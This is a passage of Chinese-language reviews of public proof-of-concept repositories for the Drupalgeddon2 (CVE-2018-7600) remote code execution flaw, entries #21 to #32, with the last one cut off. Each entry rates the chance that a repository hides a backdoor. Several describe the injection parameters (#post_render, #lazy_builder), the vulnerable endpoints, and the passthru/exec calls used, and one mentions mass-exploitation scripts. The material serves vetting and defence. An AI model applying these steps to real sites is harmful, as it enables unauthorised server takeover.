利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

**投毒风险：**

提供的漏洞利用代码仅包含GNU GPL许可协议，没有发现直接的恶意代码。但是，任何从不可信来源获取的代码都存在潜在的投毒风险。即使代码本身看起来无害，也可能存在细微的缺陷或依赖关系，这些缺陷或依赖关系可能会被恶意利用。因此，对下载的POC代码进行代码审计是必要的。

考虑到仅仅是LICENSE文件，投毒概率极低，仅为5%。

**利用方式：**

利用方式通常涉及以下步骤：

1.  **发送恶意请求：** 攻击者构造包含恶意代码的特殊请求，该请求通常通过URL参数或POST数据发送。
2.  **利用漏洞：** Drupal在处理该请求时，由于输入验证不足，会将恶意代码传递给PHP的`exec()`或类似函数执行。
3.  **执行任意代码：** 恶意代码在服务器上执行，攻击者可以控制服务器，例如安装后门、窃取数据等。

攻击者可以利用该漏洞执行任意系统命令，从而完全控制受影响的Drupal服务器。该漏洞影响多个Drupal版本，因此影响范围非常广泛。

**项目地址:** [ruthvikvegunta/Drupalgeddon2](https://github.com/ruthvikvegunta/Drupalgeddon2)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #26

**来源**: [CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md](../2018/CVE-2018-7600-shellord_CVE-2018-7600-Drupal-RCE.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁且存在默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于多个子系统存在输入验证不足的问题，允许远程攻击者执行任意代码。

**有效性：**
提供的POC代码（Drupal-RCE-Mass-Exploiter.py）针对Drupal 7和Drupal 8的不同利用方式。对于Drupal 7，它利用`user/password`表单的`#post_render`属性和`file/ajax`端点。对于Drupal 8，它利用`user/register`表单的`timezone`字段。

根据漏洞库信息和搜索引擎结果，此漏洞利用代码是有效的，多个Exploit-DB条目 (44482, 44448, 44449)和安全博客(Rapid7, Palo Alto Networks, Tenable等)确认了其存在和严重性，并且在实际环境中被广泛利用。

**投毒风险：**
此脚本本身主要功能是批量检测和利用漏洞，但仍存在潜在的投毒风险：

*   **命令执行：** 脚本允许通过`COMMAND`变量指定要执行的命令，如果攻击者修改了脚本并分享给他人，可能会将`COMMAND`设置为恶意代码。
*   **后门植入：** 虽然未直接观察到后门代码，但如果恶意用户分发修改后的版本，它们可能会添加后门植入代码，例如添加管理员账户或修改核心文件。
*   **代理风险：** 脚本支持使用代理，恶意代理服务器可能会窃取受害者服务器的敏感信息。

总体来说，脚本的投毒风险较低，约为10%，因为其主要功能是漏洞利用，但使用前仍需仔细审查代码。

**利用方式：**

1.  **Drupal 7:**
    *   利用`user/password`表单中的`name[#post_render]`属性执行命令。攻击者构造一个包含恶意PHP代码的请求，该代码将在服务器上执行。
    *   使用`file/ajax`端点来触发命令执行。
2.  **Drupal 8:**
    *   利用`user/register`表单中的`timezone`字段和`#post_render`属性执行命令。
    *   构造包含恶意PHP代码的AJAX请求，并在服务器端执行。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，影响多个Drupal版本。提供的POC代码是有效的，但使用前需要仔细审查，以避免潜在的投毒风险。攻击者可以利用此漏洞获取服务器的完全控制权。

**项目地址:** [shellord/CVE-2018-7600-Drupal-RCE](https://github.com/shellord/CVE-2018-7600-Drupal-RCE)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #27

**来源**: [CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md](../2018/CVE-2018-7600-shellord_Drupalgeddon-Mass-Exploiter.md)

## CVE-2018-7600 - Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标系统运行存在漏洞的Drupal版本，且允许外部网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 是一个存在于Drupal核心中的远程代码执行漏洞。该漏洞源于对用户提供的输入验证不足，允许攻击者在服务器上执行任意代码。

**有效性:**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性很高。漏洞库信息明确指出该漏洞允许远程代码执行，搜索结果表明存在大量针对该漏洞的利用尝试，并且已经有公开的Exploit-DB条目。提供的Python代码 `mass.py` 实现了对Drupal 7 和 Drupal 8的批量漏洞利用，进一步证明了漏洞的可利用性。

**投毒风险:**
分析提供的`mass.py`代码，发现该代码主要功能是批量检测和利用Drupal的CVE-2018-7600和CVE-2018-7602漏洞。代码结构清晰，包含漏洞检测和利用的核心逻辑，没有明显的恶意或隐藏功能。但是,批量漏洞利用脚本本身如果被恶意使用，例如，大规模扫描和攻击未经授权的系统，也存在一定的潜在风险。 `README.md` 文件描述了脚本的用法，包括指定目标列表、输出文件、worker数量和代理等，以及要利用的漏洞编号。
代码中存在使用eval或者其他类似的高危函数的情况，攻击者可能会篡改`COMMAND`变量来执行恶意操作。这种潜在的风险主要来自于用户的不当使用或者受到攻击者恶意篡改的情况，而不是代码作者有意植入后门。

**利用方式:**
1.  **Drupal 7:**
    *   利用 `user/password` 路径，通过构造特定的GET和POST参数，触发`passthru`函数执行命令。
    *   首先发送包含恶意payload的POST请求到 `user/password`，触发 Drupal 的渲染过程。
    *   然后从返回的 HTML 中提取 `form_build_id`。
    *   最后再次发送包含`form_build_id`的POST请求到 `file/ajax/name/#value/{form_build_id}`，从而执行恶意代码。
2.  **Drupal 8:**
    *   利用 `user/register` 路径，通过构造特定的GET和POST参数，触发`exec`函数执行命令。
    *   构造包含恶意payload的POST请求到 `/user/register`。
漏洞利用依赖于未打补丁的Drupal版本中存在的输入验证漏洞，攻击者可以利用这些漏洞执行任意PHP代码，从而完全控制受影响的系统。

**项目地址:** [shellord/Drupalgeddon-Mass-Exploiter](https://github.com/shellord/Drupalgeddon-Mass-Exploiter)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #28

**来源**: [CVE-2018-7600-soch4n_CVE-2018-7600.md](../2018/CVE-2018-7600-soch4n_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在服务器上执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且使用了默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个影响Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理用户输入时存在缺陷，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。PoC代码利用了`user/register`接口的Ajax功能，通过`element_parents`参数注入恶意代码。攻击者通过操纵`mail[\"a\"][#lazy_builder][0]`和`mail[\"a\"][#lazy_builder][1][]`参数，将`system`函数和`ls -la`命令注入到Drupal的渲染过程中，从而执行系统命令。提供的代码没有明显的投毒迹象，它是一个直接的漏洞利用程序，旨在展示漏洞的存在并执行任意命令。 多个来源证实该漏洞影响了大量Drupal站点，并导致大规模攻击。

**项目地址:** [soch4n/CVE-2018-7600](https://github.com/soch4n/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #29

**来源**: [CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md](../2018/CVE-2018-7600-tea-celikik_Drupal-Exploit-Lab.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码，完全控制受影响的Drupal站点。

**影响版本:** Drupal 7.x (< 7.58), 8.x (< 8.3.9), 8.4.x (< 8.4.6), and 8.5.x (< 8.5.1)

**利用条件:** 目标Drupal站点必须是受影响的版本，且没有应用相应的安全补丁。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的攻击者执行任意代码。漏洞利用代码展示了使用Metasploit的drupalgeddon2模块进行攻击的流程。 

**有效性：**
提供的POC代码基于Metasploit的`drupalgeddon2`模块，该模块是公开可用的，并且被广泛用于验证和利用此漏洞。因此，POC代码的**有效性很高**，如果目标满足漏洞利用条件，则能够成功执行。

**投毒风险：**
查看提供的漏洞利用代码，该代码主要是安装和配置Drupal 7.57以及使用Metasploit模块进行渗透测试的步骤。它还包含启用 ModSecurity 作为 WAF 的操作，并测试其防御能力，然后尝试使用 Metasploit 进行攻击。最后，展示了即使有WAF存在，攻击也失败了，没有打开 Meterpreter 会话。

虽然代码的本意是演示漏洞利用与防御，但依然存在极小的投毒风险：

*   环境配置脚本中，如果作者在安装包下载链接上做了手脚，替换成了恶意版本，存在投毒的可能性。但这部分可以通过校验安装包的HASH值来规避。
*   在ModSecurity规则配置中，如果包含了恶意的排除规则，则可能降低WAF的防御能力。然而，提供的配置看起来相对标准。考虑到该项目主要关注漏洞利用演示，而并非恶意软件分发，**投毒风险较低，估计在5%左右。**

**利用方式：**
1.  攻击者识别出运行着未修补的Drupal版本的站点。
2.  攻击者构造恶意请求，通常涉及`q`参数（Drupal的路径处理机制）。
3.  恶意请求利用了Drupal的某些组件对用户输入验证不足的缺陷。
4.  恶意请求导致在服务器上执行任意PHP代码，从而实现远程代码执行。
5.  可以使用Metasploit的`drupalgeddon2`模块自动化漏洞利用过程，或者手动构造payload。

**总结：**
CVE-2018-7600是一个严重的远程代码执行漏洞，利用方式相对简单，且有公开的Metasploit模块可用。尽管代码本身演示了漏洞利用和防御，但仍需警惕潜在的投毒风险。强烈建议受影响的Drupal站点尽快升级到安全版本。

**项目地址:** [tea-celikik/Drupal-Exploit-Lab](https://github.com/tea-celikik/Drupal-Exploit-Lab)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #30

**来源**: [CVE-2018-7600-thehappydinoa_CVE-2018-7600.md](../2018/CVE-2018-7600-thehappydinoa_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点版本在受影响范围内，且存在默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal在处理某些用户输入时存在缺陷，允许未经身份验证的攻击者通过构造特殊的请求来执行任意代码。

**有效性分析：**

*   漏洞库信息和搜索引擎结果均表明该漏洞是一个严重的安全问题，影响多个Drupal版本，并允许远程代码执行。
*   提供的POC代码尝试通过`drupal_ajax`接口注册用户，并利用`exec` markup执行bash命令。POC会执行`id`命令，并将结果写入一个随机名称的文件中，然后尝试通过HTTP访问该文件以验证漏洞利用是否成功。成功后，会尝试删除该文件。
*   多个Exploit-DB链接（如44448, 44449, 44482）表明存在公开可用的漏洞利用代码。

综合来看，提供的POC代码是有效的，可以用来验证目标Drupal站点是否存在CVE-2018-7600漏洞。

**投毒风险分析：**

*   POC代码本身主要功能是执行命令并将结果写入文件，之后验证文件是否可访问，以验证漏洞存在性。这种模式本身存在潜在的投毒风险，攻击者可以将恶意代码注入到被写入的文件中，或者修改POC使其执行更具破坏性的操作。
*   代码中`random_file_name`变量虽然使用了随机文件名，但如果被成功利用，攻击者可以精确控制写入内容和删除操作，因此存在恶意利用的可能性。
*   `download_command` 和 `rm_command` 如果被篡改，可能导致下载恶意文件或删除重要文件，因此也有潜在风险。
*   `tor_proxy`选项的存在意味着该POC可能被用于隐藏攻击者的真实IP地址，这增加了追踪和溯源的难度。
*   综合代码，投毒风险评估为10%。主要是因为POC的主要目的是验证漏洞，而大规模恶意利用需要在代码层面进行显著修改。

**利用方式分析：**

1.  **构造恶意请求：** 攻击者发送包含恶意代码的特殊构造的HTTP请求到Drupal站点。
2.  **利用`drupal_ajax`接口：** POC利用Drupal的`drupal_ajax`接口来触发漏洞。
3.  **远程代码执行：** 恶意代码通过Drupal的输入处理缺陷被执行，导致远程代码执行。
4.  **验证与清理（POC）：** POC验证代码执行成功后，会尝试清理现场（删除创建的文件）。实际攻击中，攻击者可能会执行更具破坏性的操作，例如安装后门、窃取数据或篡改网站内容。

**项目地址:** [thehappydinoa/CVE-2018-7600](https://github.com/thehappydinoa/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #31

**来源**: [CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md](../2018/CVE-2018-7600-vphnguyen_ANM_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致完全控制受影响的 Drupal 站点

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，又名 Drupalgeddon2，是一个存在于 Drupal 多个子系统中的远程代码执行漏洞。该漏洞源于 Drupal 在处理用户提供的输入时，没有进行充分的验证，攻击者可以通过精心构造的恶意请求，在服务器上执行任意代码。 

**有效性分析：**
根据漏洞库信息和搜索结果，该漏洞是一个经过验证的远程代码执行漏洞，并且存在公开可用的利用代码。大量的安全厂商和研究人员对此漏洞进行了分析和验证，证明其有效性。 

**投毒风险分析：**
提供的Python代码是一个网络数据包捕获脚本，主要用于分析网络流量，特别是HTTP流量，并检测其中是否存在CVE-2018-7600漏洞的利用尝试。 

*   **功能：** 该脚本使用 `pyshark` 库捕获网络接口上的数据包，并分析HTTP请求的URI和POST数据。它查找包含特定关键字（如`exec`, `passthru`, `system`等）的请求，这些关键字通常与远程代码执行攻击相关。  该脚本主要用于检测已知的攻击模式，而不是发起攻击。

*   **潜在投毒风险：** 虽然该脚本本身主要是用于流量分析，但仍然存在一些潜在的风险：
    *   **性能影响：** 在高流量环境下，该脚本可能会消耗大量的CPU和内存资源，导致系统性能下降。 这种消耗如果被恶意利用，可以作为一种拒绝服务攻击。
    *   **数据泄露：** 该脚本会捕获网络数据包，其中可能包含敏感信息，例如用户名、密码、API密钥等。 如果脚本的输出被不当存储或泄露，可能会导致数据泄露。
    *   **依赖风险：** `pyshark` 依赖 `tshark`，如果 `tshark` 本身存在安全漏洞，可能会影响该脚本的安全性。
    *  **后门代码：**代码中没有明显的恶意后门代码，但捕获流量到`csv`文件中可能导致信息泄露，如果该文件可以被外部访问，或者被攻击者替换，则存在风险。

**利用方式：**
根据搜索结果和漏洞描述，攻击者可以通过以下方式利用该漏洞：

1.  发送包含恶意代码的特制HTTP请求，恶意代码通常会嵌入到URL参数或POST数据中。
2.  Drupal 的某些子系统（例如节点创建、用户注册等）在处理这些请求时，由于输入验证不足，会将恶意代码传递给PHP的 `eval()` 函数或其他类似函数执行，从而导致远程代码执行。
3.  攻击者可以利用执行的代码在服务器上安装后门、窃取数据或执行其他恶意操作。

综上，该漏洞利用的有效性很高，但提供的POC代码本身更多是流量分析工具，直接投毒风险较低(5%), 但需要注意潜在的性能影响、数据泄露和依赖风险。攻击者主要通过构造恶意 HTTP 请求来触发漏洞。

**项目地址:** [vphnguyen/ANM_CVE-2018-7600](https://github.com/vphnguyen/ANM_CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #32

**来源**: [CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md](../2018/CVE-2018-7600-xxxTectationxxx_CVE-2018-7600.md)

## CVE-2018-7600 - Drupalgeddon2 RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的攻击者执行任意代码

**影响版本:** Drupal 7.x (before 7.58), 8.x (before 8.3.9), 8.4.x (before 8.4.6), and 8.5.x (before 8.5.1)

**利用条件:** 目标Drupal站点未打补丁，并且存在默认或常见模块配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。根据漏洞信息和搜索结果，此漏洞影响多个子系统，利用方式是通过构造特殊的请求，特别是利用`user/password` endpoint，结合`#post_render`属性，触发PHP的`passthru()`函数来执行任意命令。

**有效性：**

提供的PoC代码通过两个步骤利用该漏洞：

1.  发送一个包含恶意参数的POST请求到`user/password`，利用`name[#post_render][]`，`name[#markup]`和`name[#type]`参数注入命令。
2.  从响应中提取`form_build_id`，然后发送另一个包含该`form_build_id`的请求到`file/ajax/name/#value/{form_build_id}`，以触发命令执行。

